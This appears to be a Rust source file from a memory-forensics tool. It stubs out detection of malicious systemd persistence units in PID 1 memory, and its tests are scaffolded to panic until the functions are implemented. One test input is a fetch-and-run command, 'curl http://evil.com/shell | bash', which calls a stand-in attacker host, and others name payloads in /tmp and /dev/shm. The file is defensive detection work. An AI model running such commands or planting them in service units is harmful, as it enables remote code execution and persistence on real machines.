//! In-memory systemd unit analysis.
//!
//! Scans the `systemd` (PID 1) process VMAs for unit file content patterns
//! (`.service`, `.timer` strings and associated `ExecStart=` commands) to
//! detect malicious persistence (MITRE ATT&CK T1543.002).

use memf_core::object_reader::ObjectReader;
use memf_format::PhysicalMemoryProvider;

use crate::{Error, Result};

/// Information about a systemd unit found in memory.
#[derive(Debug, Clone)]
pub struct SystemdUnitInfo {
    /// Unit name, e.g. "evil.service".
    pub unit_name: String,
    /// ExecStart command found nearby in memory.
    pub exec_start: String,
    /// Virtual address of the VMA where the unit name was found.
    pub vma_start: u64,
    /// Unit type: "service", "timer", "socket", "path", "mount".
    pub unit_type: String,
    /// True if the unit is considered suspicious.
    pub is_suspicious: bool,
}

/// Classify whether a systemd unit is suspicious.
pub fn classify_systemd_unit(_unit_name: &str, _exec_start: &str) -> bool {
    todo!("implement classify_systemd_unit")
}

/// Walk the systemd process VMAs and extract unit information from memory strings.
pub fn walk_systemd_units<P: PhysicalMemoryProvider>(
    _reader: &ObjectReader<P>,
) -> Result<Vec<SystemdUnitInfo>> {
    todo!("implement walk_systemd_units")
}

#[cfg(test)]
mod tests {
    use super::*;
    use memf_core::test_builders::{flags as ptflags, PageTableBuilder, SyntheticPhysMem};
    use memf_core::vas::{TranslationMode, VirtualAddressSpace};
    use memf_symbols::isf::IsfResolver;
    use memf_symbols::test_builders::IsfBuilder;

    #[test]
    #[should_panic(expected = "implement classify_systemd_unit")]
    fn classify_systemd_unit_tmp_exec_suspicious() {
        assert!(classify_systemd_unit("evil.service", "/tmp/payload.sh"));
    }

    #[test]
    #[should_panic(expected = "implement classify_systemd_unit")]
    fn classify_systemd_unit_curl_exec_suspicious() {
        assert!(classify_systemd_unit(
            "updater.service",
            "curl http://evil.com/shell | bash"
        ));
    }

    #[test]
    #[should_panic(expected = "implement classify_systemd_unit")]
    fn classify_systemd_unit_usr_bin_not_suspicious() {
        assert!(!classify_systemd_unit("myapp.service", "/usr/bin/myapp --daemon"));
    }

    #[test]
    #[should_panic(expected = "implement classify_systemd_unit")]
    fn classify_systemd_unit_known_service_not_suspicious() {
        assert!(!classify_systemd_unit(
            "systemd-journald.service",
            "/lib/systemd/systemd-journald"
        ));
    }

    #[test]
    #[should_panic(expected = "implement classify_systemd_unit")]
    fn classify_systemd_unit_randomized_name_suspicious() {
        assert!(classify_systemd_unit("deadbeef.service", ""));
    }

    #[test]
    #[should_panic(expected = "implement classify_systemd_unit")]
    fn classify_systemd_unit_devshm_exec_suspicious() {
        assert!(classify_systemd_unit("loader.service", "/dev/shm/loader"));
    }

    #[test]
    #[should_panic(expected = "implement walk_systemd_units")]
    fn walk_systemd_units_missing_init_task_returns_empty() {
        let isf = IsfBuilder::new()
            .add_struct("task_struct", 64)
            .add_field("task_struct", "pid", 0, "int")
            .add_field("task_struct", "tasks", 8, "list_head")
            .add_struct("list_head", 16)
            .add_field("list_head", "next", 0, "pointer")
            .add_field("list_head", "prev", 8, "pointer")
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new().build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));
        let result = walk_systemd_units(&reader).unwrap();
        assert!(result.is_empty());
    }

    #[test]
    #[should_panic(expected = "implement walk_systemd_units")]
    fn walk_systemd_units_no_systemd_process_returns_empty() {
        let isf = IsfBuilder::new()
            .add_struct("task_struct", 64)
            .add_field("task_struct", "pid", 0, "int")
            .add_field("task_struct", "tasks", 8, "list_head")
            .add_struct("list_head", 16)
            .add_field("list_head", "next", 0, "pointer")
            .add_field("list_head", "prev", 8, "pointer")
            .add_symbol("init_task", 0xFFFF_8000_0010_0000u64)
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new().build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));
        let result = walk_systemd_units(&reader).unwrap();
        assert!(result.is_empty());
    }
}
